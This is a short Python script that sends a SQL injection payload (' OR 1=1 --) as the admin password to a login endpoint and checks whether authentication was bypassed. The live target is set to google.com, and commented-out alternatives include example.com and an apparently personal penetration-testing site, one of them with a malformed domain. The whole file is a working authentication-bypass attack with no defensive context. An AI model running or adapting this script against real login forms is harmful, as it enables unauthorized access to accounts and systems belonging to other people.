import requests
#url = "https://example.com/login.php"
url = "https://google.com"
#url =  "https://cprojectpenetrationtesting.kesug.comc"
payload = "' OR 1=1 --"
data = {
    "username": "admin",
    "password": payload
}
response = requests.post(url, data=data)

if "Login successful" in response.text:
    print("SQL injection successful! Admin login bypassed.")
else:
    print("SQL injection failed.")
